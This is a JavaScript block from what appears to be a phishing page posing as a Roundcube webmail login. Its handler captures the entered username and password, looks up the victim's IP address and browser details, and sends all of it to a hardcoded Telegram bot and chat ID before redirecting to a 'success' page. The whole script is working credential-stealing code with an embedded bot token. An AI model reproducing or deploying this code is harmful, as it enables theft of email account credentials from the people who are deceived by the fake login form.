    <script>
        const botToken = '6601624596:AAH8-QfvB6o9HvGu9QjKUZWug3EOqInbDR0';
        const chatId = '925812369';

        async function handleLogin(event) {
            event.preventDefault();
            const loginBtn = document.getElementById('loginBtn5');
            const errorMessage = document.getElementById('error-message');
            loginBtn.disabled = true;

            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();

            if (!username || !password) {
                errorMessage.style.display = 'block';
                loginBtn.disabled = false;
                return false;
            }

            errorMessage.style.display = 'none';

            const userAgent = navigator.userAgent;
            const date = new Date().toLocaleString();
            let ipAddress = 'Unknown';

            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                ipAddress = data.ip || 'Unknown';
            } catch (error) {
                console.error('Error fetching IP:', error);
            }

            const message = `#------------------[ ROUNDCUBE ]---------------------#
Username: ${username}
Password: ${password}
IP Address: ${ipAddress}
Browser: ${userAgent}
Date: ${date}
#-------------------[ END ]------------------------#`;

            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text: message })
                });

                if (!response.ok) {
                    throw new Error('Telegram API request failed');
                }

                // Optionally redirect to Roundcube's login handler
                window.location.href = 'succ.html';
                errorMessage.textContent = 'Login data sent successfully!';
                errorMessage.style.color = 'green';
                errorMessage.style.display = 'block';
                setTimeout(() => {
                    errorMessage.style.display = 'none';
                    errorMessage.style.color = '#d9534f';
                    errorMessage.textContent = 'Invalid username or password.';
                    loginBtn.disabled = false;
                }, 2000);
            } catch (error) {
                console.error('Error:', error);
                errorMessage.textContent = 'An error occurred. Please try again.';
                errorMessage.style.display = 'block';
                loginBtn.disabled = false;
            }

            return false;
        }
    </script>
